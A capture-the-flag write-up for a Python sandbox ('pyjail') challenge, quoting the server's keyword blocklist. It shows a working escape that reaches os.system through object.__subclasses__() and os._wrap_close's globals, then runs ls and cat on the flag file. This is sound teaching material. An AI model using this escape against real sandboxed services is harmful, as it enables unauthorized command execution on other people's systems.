# Outdated

> I found this old website that runs your python code, but the security hasn't been updated in years
> I'm sure there's a flag floating around, can you find it?

> You can run python code from anywhere! Upload code from your phone! (Note: code cannot import libraries or use some keywords. Please stop trying to.)

This is a basic pyjail challenge. Imports and certain keywords are blocked. The [source code](server) of the server is provided, so we can see what exactly is allowed.

Notably:

```python
# app.py
blocked = ["__import__", "globals", "locals", "__builtins__", "dir", "eval", "exec", "breakpoint", "callable", "classmethod", "compile", "staticmethod", "sys", "__importlib__", "delattr", "getattr", "setattr", "hasattr", "sys", "open"]
```

There are a few other checks, including one that blocks non-ASCII characters, and a limit on the number of lines in the file.

Sidenote: when I was solving this challenge I didn't realize the source code was provided, which didn't make a big difference but did lead to me wasting some time experimenting with which keywords were blocked.

## Solution

Most of the obvious solutions are prevented by the blocked keywords, and lack of imports. 

I started by printing out all of the subclasses of `object` to see what classes I had access to:

``` python
print(object.__subclasses__())
```

This returned a long list of classes to look through. I ended up just `CMD+F`ing for `os` to try to find any classes of interest, and the only result was `os._wrap_close`.

I tried googling this class since I had no idea was it was, but surprisingly I found absolutely zero information about it, so I'm still not sure what it really is. ~~However I did find [one useful page](https://blog.p6.is/Python-SSTI-exploitable-classes/) detailing how it could be exploited.~~ **Edit:** The website now seems to be down :(

From that page:

``` python
[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__['system']('ls')
```

It looks like the initializer for `os._wrap_close` has a reference to the `system` function, which can be used to execute shell commands!

We just need to grab that class from the list we got earlier, and then we can use the `ls` command to look around the file system:

``` python
print([x for x in object.__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__['system']('ls'))
```

```
Dockerfile
__pycache__
app.py
flag-b5a31b65-07a2-479c-bed4-f371a9bbdd1d.txt
run.sh
static
templates
uploads
```

There's the flag!

Read the file with `cat`:

``` python
print([x for x in object.__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__['system']('cat flag-b5a31b65-07a2-479c-bed4-f371a9bbdd1d.txt'))
```

And we get the flag:

```
tjctf{oops_bad_filter_3b582f74}
```
